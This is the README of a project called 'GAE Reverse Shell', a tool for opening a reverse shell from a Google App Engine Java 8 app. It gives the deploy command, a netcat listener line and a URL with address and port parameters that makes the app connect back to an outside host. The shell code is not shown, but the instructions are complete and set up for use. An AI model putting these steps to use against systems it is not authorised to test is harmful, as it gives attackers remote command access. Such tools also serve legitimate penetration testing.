# GAE Reverse Shell
Google App Engine reverse shell (Standard Java 8 environment)

Deploy:

    mvn appengine:deploy
Run in terminal:

    nc -lv <PORT>

Open in browser:

    http://<APP>.appspot.com/shell?addr=<IP>&port=<PORT>

[BusyBox license](https://www.busybox.net/license.html)

[BusyBox source-code used](https://www.busybox.net/downloads/busybox-1.29.3.tar.bz2)
